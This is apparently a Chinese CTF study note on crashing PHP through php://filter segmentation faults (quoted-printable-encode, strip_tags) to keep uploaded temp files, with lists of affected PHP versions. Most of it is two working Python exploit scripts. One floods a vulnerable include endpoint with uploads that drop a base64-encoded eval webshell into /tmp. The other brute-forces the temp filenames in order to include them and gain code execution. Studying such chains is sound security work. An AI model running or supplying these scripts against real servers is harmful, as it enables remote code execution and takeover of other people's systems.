
## Segmentation fault
参考文章
- https://hackmd.io/s/Hk-2nUb3Q
- https://www.jianshu.com/p/dfd049924258


### 关于下面的版本问题
参考：
- https://bugs.php.net/bug.php?id=77359  
  
通过在PHP的changelog页面    
- https://www.php.net/ChangeLog-7.php
- https://www.php.net/ChangeLog-5.php
搜寻77359我们可以发现php在php5和7.0-7.3的版本中都进行了修复。所以printable的利用版本如下：  
- php5<5.6.39
- php7.0<7.0.33
- php7.1<7.1.25
- php7.2<7.2.13
- php7.3不可利用
  
trip_tags的利用环境在php7.0环境下都可以利用，其他版本未知。

### 超大字符
参考上面的文章可知下列语句可以触发fault，但是我在当时比赛过后测试也就是2018年测试(php7.2.10)的时候是可以的，但是我在19年5.14日测试发现php5.6，php(7.0.33,7.1.29,7.2.18,7.3,5)都不可以了。可能时修复了，但是如果安装了旧版本没有升级(小本版号码)的话，应该还是纯在的吧？

```php
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
```

### trip_tags

同上，但是此时测试在版本PHP7.0.33成功复现
```
<?php
include("php://filter/string.strip_tags/resource=/etc/passwd");
?>

```


作者写的利用脚本
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
import itertools

charset = string.digits + string.letters

host = "192.168.43.155"
port = 80
base_url = "http://%s:%d" % (host, port)


def upload_file_to_include(url, file_content):
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
    try:
        response = requests.post(url, files=files)
    except Exception as e:
        print e


def generate_tmp_files():
    webshell_content = '<?php eval($_REQUEST[c]);?>'.encode(
        "base64").strip().encode("base64").strip().encode("base64").strip()
    file_content = '<?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s"))){echo "flag";}?>' % (
        webshell_content)
    phpinfo_url = "%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd" % (
        base_url)
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url, file_content)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

charset = string.digits + string.letters

host = "192.168.43.155"
port = 80
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/include.php?f=/tmp/php%s" % (
                                base_url, filename)
                            print url
                            try:
                                response = requests.get(url)
                                if 'flag' in response.content:
                                    print "[+] Include success!"
                                    return True
                            except Exception as e:
                                print e
    return False


def main():
    brute_force_tmp_files()


if __name__ == "__main__":
    main()
```